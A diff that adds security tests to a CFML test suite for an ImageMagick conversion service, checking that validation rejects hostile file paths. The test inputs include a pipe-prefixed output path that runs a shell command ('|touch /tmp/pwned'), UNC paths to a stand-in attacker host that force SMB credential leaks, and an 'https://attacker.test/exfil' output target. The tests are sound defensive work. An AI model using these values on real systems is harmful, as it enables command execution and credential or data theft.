@@ -82,6 +82,41 @@ component extends="tests.resources.baseTest" {
                 )).toThrow('ImageMagick.InputValidationException');
             });
 
+            it('Throws for a path using a UNC network path (SSRF/credential-leak via forced SMB auth)', () => {
+                expect(() => imageService.convert(path = '\\attacker.test\share\evil.jpg', outputPath = tempDir & '/out.jpg')).toThrow('ImageMagick.InputValidationException');
+            });
+
+            it('Throws for an outputPath starting with a pipe (ImageMagick PIPE coder command execution)', () => {
+                expect(() => imageService.convert(
+                    path       = expandPath('/tests/resources/jpg_example.jpg'),
+                    outputPath = '|touch /tmp/pwned'
+                )).toThrow('ImageMagick.InputValidationException');
+            });
+
+            it('Throws for an outputPath using an ImageMagick coder/protocol prefix (SSRF via https:/label:/mpr: delegates)', () => {
+                expect(() => imageService.convert(
+                    path       = expandPath('/tests/resources/jpg_example.jpg'),
+                    outputPath = 'https://attacker.test/exfil'
+                )).toThrow('ImageMagick.InputValidationException');
+            });
+
+            it('Throws for an outputPath using a UNC network path', () => {
+                expect(() => imageService.convert(
+                    path       = expandPath('/tests/resources/jpg_example.jpg'),
+                    outputPath = '\\attacker.test\share\out.jpg'
+                )).toThrow('ImageMagick.InputValidationException');
+            });
+
+            it('Allows an outputPath using a Windows drive letter (not mistaken for a coder prefix)', () => {
+                var outputPath = tempDir & '/' & createUUID() & '.jpg';
+
+                expect(() => imageService.convert(
+                    path       = expandPath('/tests/resources/jpg_example.jpg'),
+                    outputPath = outputPath
+                )).notToThrow();
+                expect(fileExists(outputPath)).toBeTrue();
+            });
+
             it('Throws for a quality outside the 0-100 range', () => {
                 expect(() => imageService.convert(
                     path       = expandPath('/tests/resources/jpg_example.jpg'),
